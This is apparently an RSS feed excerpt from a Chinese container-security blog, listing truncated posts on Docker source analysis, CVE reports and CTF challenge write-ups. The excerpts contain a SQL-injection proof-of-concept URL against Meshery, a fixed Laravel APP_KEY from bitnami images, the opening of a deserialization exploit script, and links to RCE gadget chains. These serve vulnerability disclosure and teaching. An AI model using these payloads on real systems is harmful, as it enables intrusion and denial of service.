      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/how-to-build-docker.html</link>
      <pubDate>Thu, 20 May 2021 09:12:48 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B9%B6%E7%BC%96%E8%AF%91%E4%BB%A3%E7%A0%81/how-to-build-docker.html</guid>
      <description>tags: container how to build docker 1. build 根据docker官方文档,一步步来即可。
1.清空容器、镜像等避免影响build过程
docker system prune -a docker volume prune 2.下载代码
git clone https://github.com/moby/moby.git 3.进入docker提供的编译环境
cd moby make BIND_DIR=. shell 等待约15分钟，会进入到一个容器
root@7fd23c4e7515:/go/src/github.com/docker/docker# 4.修改代码 修改cmd/dockerd/docker.go中的代码
sed -i &amp;quot;s@build %s@build %s, modified by st0n3@g&amp;quot; cmd/dockerd/docker.go 5.build
hack/make.sh binary install-binary 6.binary build好的二进制文件位于/go/src/github.com/docker/docker/bundles/binary-daemon
root@7fd23c4e7515:/go/src/github.com/docker/docker/bundles/binary-daemon# ./dockerd --version Docker version dev, build d086c52c9a, modified by st0n3 2. troubleshooting 2.1 GFW 配置systemd代理
https://docs.docker.com/config/daemon/systemd/
也可以使用socks协议
[Service] Environment=&amp;quot;HTTP_PROXY=socks5://172.17.0.1:1082/&amp;quot; Environment=&amp;quot;HTTPS_PROXY=socks5://172.17.0.1:1082/&amp;quot; 使用以下命令获取环境或编译二进制
make DOCKER_BUILD_APT_MIRROR=ftp.</description>
    </item>
    
    <item>
      <title>[漏洞报告] CVE-2021-31856: Meshery sql注入</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E7%94%9F%E6%80%81%E5%AE%89%E5%85%A8/Solutions/Service-Mesh/meshery/CVE-2021-31856/%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A-CVE-2021-31856-Meshery-sql%E6%B3%A8%E5%85%A5.html</link>
      <pubDate>Wed, 05 May 2021 15:32:10 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E7%94%9F%E6%80%81%E5%AE%89%E5%85%A8/Solutions/Service-Mesh/meshery/CVE-2021-31856/%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A-CVE-2021-31856-Meshery-sql%E6%B3%A8%E5%85%A5.html</guid>
      <description>tags: container,漏洞报告 [漏洞报告] CVE-2021-31856: Meshery sql注入 最近，我在学习codeql时，偶然间发现了Meshery中的一个sql注入漏洞。问题本身比较简单，但codeql在其中的作用，可以作为其效果的示例，我会在后续的文章中尝试介绍一下如何使用codeql发现类似漏洞。
报告给meshery4天后，他们完成了修复,并帮我申请了CVE编号（CVE-2021-31856）。
https://docs.meshery.io/project/security-vulnerabilities#list-of-announced-vulnerabilities
    item 描述     项目地址 https://github.com/layer5io/meshery   公布日期 2021-04-28   CVE-ID CVE-2021-31856   影响版本 v0.5.2   修复版本 v0.5.3
https://github.com/layer5io/meshery/pull/2745   CVSS 7.5 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N   作者 https://github.com/ssst0n3    1. 描述 Meshery是CNCF成员之一(https://landscape.cncf.io/?category=cncf-members&amp;amp;fullscreen=yes&amp;amp;grouping=category&amp;amp;selected=meshery)。作为服务网格管理平面，Meshery 支持任何服务网格及其工作负载的采用、操作和管理。
GetMesheryPatterns() 函数(位于meshery/models/meshery_pattern_persister.go)存在一个SQL注入漏洞，注入点是/api/experimental/patternfile?order=id%3Bselect(randomblob(1000000000))&amp;amp;page=0&amp;amp;page_size=0中的order参数。
2. PoC http://&amp;lt;IP&amp;gt;:9081/api/experimental/patternfile?order=id%3Bselect(randomblob(1000000000))&amp;amp;page=0&amp;amp;page_size=0 watch the video
Your browser doesn&#39;t support HTML5 video. Here is a link to the video instead.</description>
    </item>
    
    <item>
      <title>[Vulnerability Report] CVE-2021-31856: A Sql Injection in Meshery</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E7%94%9F%E6%80%81%E5%AE%89%E5%85%A8/Solutions/Service-Mesh/meshery/CVE-2021-31856/Vulnerability-Report-CVE-2021-31856-A-Sql-Injection-in-Meshery.html</link>
      <pubDate>Wed, 05 May 2021 13:33:53 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E7%94%9F%E6%80%81%E5%AE%89%E5%85%A8/Solutions/Service-Mesh/meshery/CVE-2021-31856/Vulnerability-Report-CVE-2021-31856-A-Sql-Injection-in-Meshery.html</guid>
      <description>tags: container,漏洞报告 [Vulnerability Report] CVE-2021-31856: A Sql Injection in Meshery    item details note     project https://github.com/layer5io/meshery    date announced 2021-04-28    CVE-ID CVE-2021-31856 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31856   EDB-ID \    Vulnerable Version v0.5.2 \   Patched Version v0.5.3 https://github.com/layer5io/meshery/pull/2745   CVSS 7.5 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N    Author https://github.com/ssst0n3     1. Description GetMesheryPatterns() function in meshery/models/meshery_pattern_persister.</description>
    </item>
    
    <item>
      <title>docker reexec源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-reexec%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Tue, 04 May 2021 11:15:40 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-reexec%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: container,源码分析 docker reexec源码分析 本文编写时，最新release为v20.10.6, 因此代码均为v20.10.6分支的代码
1. reexec简介 reexec库位于pkg下，是一个相对独立且可以由外部使用的模块。根据readme, reexec模块是为了提供重新调用docker二进制文件的能力，类似fork的概念。
 The reexec package facilitates the busybox style reexec of the docker binary that we require because of the forking limitations of using Go.
 fork函数将运行着的程序分成2个（几乎）完全一样的进程，每个进程都启动一个从代码的同一位置开始执行的线程。
在Go语言中，由于屏蔽了进程、线程的概念，而只提供了goroutine的概念，导致我们无法直接操作fork调用。我们常用的os/exec是相当于fork+exec的方案，它启动一个新的子进程，执行不共享任何内存或 Go 运行时的不同可执行文件。
因此docker自行实现了reexec库，来提供类似于fork的能力，但并不是一个特别高深的概念，实现也很简单。实际上，reexec仍然会调用os/exec调用一个子进程，与直接使用os/exec的区别在于这个子进程的二进制文件是docker本身，它执行的代码是docker中的一个函数。
2. reexec库使用介绍 在具体分析reexec前，我们先看一下reexec的使用。
在程序主体逻辑执行前，调用reexec.Init(),这个函数用于判断当前进入程序主体逻辑，还是进入reexec子命令。
https://github.com/moby/moby/blob/v20.10.6/cmd/dockerd/docker.go#L72-L74
func main() { if reexec.Init() { return } ... 以docker-tar为例，要向reexec,将tar函数注册名为docker-tar的“命令”。
https://github.com/moby/moby/blob/v20.10.6/pkg/chrootarchive/init_unix.go#L17
reexec.Register(&amp;quot;docker-tar&amp;quot;, tar) 在使用时，调用reexec.Command获得一个os/exec.Cmd实例。后续使用和使用os/exec库一致。
https://github.com/moby/moby/blob/v20.10.6/pkg/chrootarchive/archive_unix.go#L178
cmd := reexec.Command(&amp;quot;docker-tar&amp;quot;, relSrc, root) 使用时只需增加以上3个调用即可。
3. reexec实现分析 3.1 reexec.</description>
    </item>
    
    <item>
      <title>docker cp 源码分析</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-cp/docker-cp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</link>
      <pubDate>Tue, 27 Apr 2021 08:27:47 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-cp/docker-cp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</guid>
      <description>tags: container,源码分析 docker cp 源码分析 本文编写时，最新release为v20.10.6, 因此代码均为v20.10.6分支的代码
1. docker cp简介 在容器和宿主机的文件系统直接复制文件。执行cp命令的入口有两个，分别是docker container cp和docker cp, 两者作用相同， 后者可能在未来会被删除。
https://docs.docker.com/engine/reference/commandline/container_cp/
2. 源码入口位置 由cli接收cp命令参数,发送至docker engine api
cli与engine api的代码入口分别位于:
https://github.com/docker/cli/blob/v20.10.6/cli/command/container/cp.go#L43
https://github.com/moby/moby/blob/v20.10.6/api/server/router/container/copy.go
3. docker-cli 执行cp命令的两个入口分别位于
https://github.com/docker/cli/blob/v20.10.6/cli/command/container/cmd.go#L20
func NewContainerCommand(dockerCli command.Cli) *cobra.Command { ... cmd.AddCommand( ... NewCopyCommand(dockerCli), ... https://github.com/docker/cli/blob/v20.10.6/cli/command/commands/commands.go#L96
func AddCommands(cmd *cobra.Command, dockerCli command.Cli) { ... cmd.AddCommand( ... hide(container.NewCopyCommand(dockerCli)), ... 两者分别用docker cp命令和docker container cp命令，两者都调用同一个函数NewCopyCommand。
https://github.com/docker/cli/blob/v20.10.6/cli/command/container/cp.go#L43
func NewCopyCommand(dockerCli command.Cli) *cobra.Command { var opts copyOptions cmd := &amp;amp;cobra.Command{ ... Args: cli.</description>
    </item>
    
    <item>
      <title>docker考古:如何确定docker-ce与containerd.io版本对应关系</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E6%97%A7%E7%89%88%E6%9C%ACdocker/docker%E8%80%83%E5%8F%A4%E5%A6%82%E4%BD%95%E7%A1%AE%E5%AE%9Adocker-ce%E4%B8%8Econtainerd.io%E7%89%88%E6%9C%AC%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB.html</link>
      <pubDate>Fri, 23 Apr 2021 09:13:15 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E6%97%A7%E7%89%88%E6%9C%ACdocker/docker%E8%80%83%E5%8F%A4%E5%A6%82%E4%BD%95%E7%A1%AE%E5%AE%9Adocker-ce%E4%B8%8Econtainerd.io%E7%89%88%E6%9C%AC%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB.html</guid>
      <description>tags: container docker考古:如何确定docker-ce与containerd.io版本对应关系 以ubuntu focal为例
确认docker-ce组件release时间 https://download.docker.com/linux/ubuntu/dists/focal/pool/stable/amd64/
根据docker-ce的发布时间及docker-ce中的依赖关系，可以确定一个containerd.io的大致范围，选取较新版本即可。
../ containerd.io_1.2.13-2_amd64.deb 2020-07-28 16:39:02 20.4 MiB containerd.io_1.3.7-1_amd64.deb 2020-10-08 20:39:20 23.2 MiB containerd.io_1.3.9-1_amd64.deb 2020-11-30 22:57:53 23.2 MiB containerd.io_1.4.3-1_amd64.deb 2020-12-09 01:55:15 26.8 MiB containerd.io_1.4.3-2_amd64.deb 2021-04-08 00:35:52 27.0 MiB containerd.io_1.4.4-1_amd64.deb 2021-04-08 00:35:53 27.0 MiB docker-ce-cli_19.03.10~3-0~ubuntu-focal_amd64.deb 2020-07-28 16:39:03 39.3 MiB docker-ce-cli_19.03.11~3-0~ubuntu-focal_amd64.deb 2020-07-28 16:39:04 39.3 MiB docker-ce-cli_19.03.12~3-0~ubuntu-focal_amd64.deb 2020-07-28 16:39:05 39.3 MiB docker-ce-cli_19.03.13~3-0~ubuntu-focal_amd64.deb 2020-10-08 20:39:21 42.1 MiB docker-ce-cli_19.03.14~3-0~ubuntu-focal_amd64.deb 2020-12-08 16:25:36 42.1 MiB docker-ce-cli_19.03.15~3-0~ubuntu-focal_amd64.deb 2021-02-25 07:28:46 42.1 MiB docker-ce-cli_19.</description>
    </item>
    
    <item>
      <title>CVE-2019-14271分析与复现</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/docker-software/plumbing/docker-cp/CVE-2019-14271/%E5%88%86%E6%9E%90/CVE-2019-14271%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html</link>
      <pubDate>Tue, 30 Mar 2021 06:32:34 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/docker-software/plumbing/docker-cp/CVE-2019-14271/%E5%88%86%E6%9E%90/CVE-2019-14271%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html</guid>
      <description>tags: container,漏洞分析 docker CVE-2019-14271分析与复现 一、基本信息    条目 详情 备注     项目地址 https://github.com/moby/moby    发布日期 2019-07-25    CVE-ID CVE-2019-14271    EDB-ID \    exploits swr.cn-southwest-2.myhuaweicloud.com/container_pentest/cve-2019-14271:v0.1
https://bestwing.me/CVE-2019-14271-docker-escape.html
https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/    cvedetails https://www.cvedetails.com/cve/CVE-2019-14271/    官方公告影响范围 v19.03.0    实际影响范围 v18.09.9&amp;lt;=docker&amp;lt;v19.03.8    业界公告修复版本 v19.03.1 紧急修复   实际修复版本 v19.03.8 完整修复   CVSS 9.8 CVSS:3.</description>
    </item>
    
    <item>
      <title>[漏洞报告]APP_KEY在容器镜像bitnami/laravel中是固定的</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/%E9%95%9C%E5%83%8F%E5%AE%89%E5%85%A8/%E6%9E%84%E5%BB%BA%E5%AE%89%E5%85%A8/CVE-2021-21979-APP_KEY-is-fixed-in-docker-image-bitnami/laravel/%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8AAPP_KEY%E5%9C%A8%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8Fbitnamilaravel%E4%B8%AD%E6%98%AF%E5%9B%BA%E5%AE%9A%E7%9A%84.html</link>
      <pubDate>Thu, 04 Mar 2021 11:33:26 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/%E9%95%9C%E5%83%8F%E5%AE%89%E5%85%A8/%E6%9E%84%E5%BB%BA%E5%AE%89%E5%85%A8/CVE-2021-21979-APP_KEY-is-fixed-in-docker-image-bitnami/laravel/%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8AAPP_KEY%E5%9C%A8%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8Fbitnamilaravel%E4%B8%AD%E6%98%AF%E5%9B%BA%E5%AE%9A%E7%9A%84.html</guid>
      <description>tags: container,漏洞报告 [漏洞报告]CVE-2021-21979: APP_KEY在容器镜像bitnami/laravel中是固定的 最近，我在思考容器供应链安全时，发现了一个容器镜像构建产生的漏洞(CVE-2021-21979)。问题本身比较简单，但具有较强的启发意义，可以作为一个绝佳的示例。
这个问题在2021.02.23报告给bitnami,在2021.02.24就完成了修复,并帮我申请了CVE编号。
https://github.com/bitnami/bitnami-docker-laravel/issues/139
1. 漏洞简介 用户使用image bitnami/laravel时，如果文件/app/config/database.php不存在，则文件/app/.env将被文件/tmp/app/.env覆盖。
if [[ ! -f /app/config/database.php ]]; then log &amp;quot;Creating laravel application&amp;quot; cp -a /tmp/app/. /app/ fi 然而，/tmp/app/.env这个文件是在docker镜像bitnami/laravel构建的时候生成的，APP_KEY的值是固定的。
虽然每次从源码安装laravel的时候APP_KEY都会随机生成：
// 文件 https://github.com/laravel/laravel/blob/8.x/composer.json ... &amp;quot;@php artisan key:generate --ansi&amp;quot; 但是如果我们把它构建成docker镜像，无论何时运行，APP_KEY都是一个固定的值。
因此，我们可以知道所有镜像中APP_KEY的值，而这个值对laravel框架的安全性至关重要。
2. 基于这个漏洞出的一道CTF题目 我出了一道CTF题，用于提供这个漏洞的poc。
 请在http://139.159.204.145:3000/ 中获取文件/flag的内容。
附件：https://github.com/ssst0n3/ssst0n3_challenges_public/tree/main/container/latest_laravel/attachments
 exploit 在这个挑战中，我把EncryptCookies.php文件中的$serialize变量设置为true，以使攻击更容易。
protected static $serialize = true; 只要我们能得到APP_KEY来加密我们的payload，我们就可以进行反序列化攻击。
而APP_KEY可以通过迭代所有镜像来找到。
exploit:
╭─st0n3@yoga in ~/ctf_project/my_challenges/container/latest_laravel/exp on master ✔ (origin/master) ╰$ ./exp.sh + APP_KEY=xmdC9cSx0QWwOtm9mdG0xfdS3HWQJRtG4DhxmA3pOz4= + python -c import base64;print base64.</description>
    </item>
    
    <item>
      <title>Original Mails with Bitnami for CVE-2021-21979</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/%E9%95%9C%E5%83%8F%E5%AE%89%E5%85%A8/%E6%9E%84%E5%BB%BA%E5%AE%89%E5%85%A8/CVE-2021-21979-APP_KEY-is-fixed-in-docker-image-bitnami/laravel/Original-Mails-with-Bitnami-for-CVE-2021-21979.html</link>
      <pubDate>Thu, 04 Mar 2021 06:37:29 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9/%E9%95%9C%E5%83%8F%E5%AE%89%E5%85%A8/%E6%9E%84%E5%BB%BA%E5%AE%89%E5%85%A8/CVE-2021-21979-APP_KEY-is-fixed-in-docker-image-bitnami/laravel/Original-Mails-with-Bitnami-for-CVE-2021-21979.html</guid>
      <description>tags: email Original Mails with Bitnami for CVE-2021-21979 [1] [Vulnerability Report] APP_KEY is fixed in docker image bitnami/laravel st0n3 ss ssst0n3@gmail.com	23 February 2021 at 15:58
To: security@vmware.com
Hello, bitnami!
I am a security researcher. Seems I have found a vulnerability in docker image bitnami/laravel. Please check it, thank you!
 1. Description if file /app/config/database.php not exists when users use image bitnami/laravel, the file /app/.env will be replaced by file /tmp/app/.</description>
    </item>
    
    <item>
      <title>CVE-2019-16884分析与复现</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/linux-security-features/what-you-can-actually-do/LSM/apparmor/CVE-2019-16884/CVE-2019-16884%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html</link>
      <pubDate>Fri, 26 Feb 2021 03:56:21 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/linux-security-features/what-you-can-actually-do/LSM/apparmor/CVE-2019-16884/CVE-2019-16884%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html</guid>
      <description>tags: container,cve,漏洞分析 CVE-2019-16884分析与复现 一、基本信息    条目 详情 备注     项目地址 https://github.com/opencontainers/runc    发布日期 2019-09-25    CVE-ID CVE-2019-16884 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16884   EDB-ID \ \   exploits https://twitter.com/adam_iwaniuk/status/1175741830136291328
https://gist.github.com/leoluk/2513b6bbff8aa5cd623f3d7d7f20871a    cvedetails https://www.cvedetails.com/cve/CVE-2019-16884/ \   影响范围 runc &amp;lt;= 1.0.0-rc8    修复版本 1.0.0-rc9 d736ef14f0288d6993a1845745d6756cfc9ddd5a   CVSS 7.5 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N     二、runc简介 runc是一个根据OCI规范实现的CLI工具，用于生成和运行容器，docker的runtime使用的就是runc。
三、漏洞简介 1. 简介 在容器镜像中可以声明一个VOLUME, 挂载至/proc, 欺骗runc使其认为AppArmor已经成功应用，从而绕过AppArmor策略。</description>
    </item>
    
    <item>
      <title>出题报告: container/latest_laravel</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E5%87%BA%E9%A2%98/hwctf202102/%E5%87%BA%E9%A2%98%E6%8A%A5%E5%91%8A-containerlatest_laravel.html</link>
      <pubDate>Thu, 04 Feb 2021 07:55:36 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E5%87%BA%E9%A2%98/hwctf202102/%E5%87%BA%E9%A2%98%E6%8A%A5%E5%91%8A-containerlatest_laravel.html</guid>
      <description>出题报告: container/latest_laravel 一、题目基本信息  题目标题：latest_laravel 题目类别：container 难度：4/5 预计解题时间：8h 收录比赛：hwctf202102   请获取服务器http://{hostname}中/flag文件内容，flag格式为flag{xxx}
题目附件：https://github.com/ssst0n3/ssst0n3_challenges_public/tree/main/container/latest_laravel/attachments
 二、设计思路 1. a 0day of image bitnami/laravel 如果用户在使用bitnami/laravel镜像时，/app/config/database.php文件不存在，则/tmp/app/.env会覆盖/app/.env
 if [[ ! -f /app/config/database.php ]]; then log &amp;quot;Creating laravel application&amp;quot; cp -a /tmp/app/. /app/ fi https://github.com/bitnami/bitnami-docker-laravel/blob/master/7/debian-10/rootfs/app-entrypoint.sh
虽然laravel在安装时会随机生成APP_KEY, 但在每个bitnami/laravel镜像build时，已经是一个确定值了。 因此我们可以知道所有bitnami/laravel镜像的APP_KEY, 而这个文件对laravel框架的安全性是至关重要的。
根据这个供应链层的漏洞，出了这个题目。
2. From APP_KEY disclosure to laravel RCE 可借鉴：
 https://github.com/ambionics/phpggc/tree/master/gadgetchains/Laravel/RCE/7 https://github.com/kozmic/laravel-poc-CVE-2018-15133  三、writeup 1. something interesting  docker-compose.yml在使用bitnami/laravel时，使用了latest标签，而不是一个固定的版本 docker-compose.yml在挂载文件时，挂载到了/tmp/目录，而不是/app目录 奇怪的一句话： archived @Jan 31, 2021 at 7:54 pm，好像是在说这个文件归档的时间点 目前laravel的最新版本是8.</description>
    </item>
    
    <item>
      <title>出题报告: container/registry_misc</title>
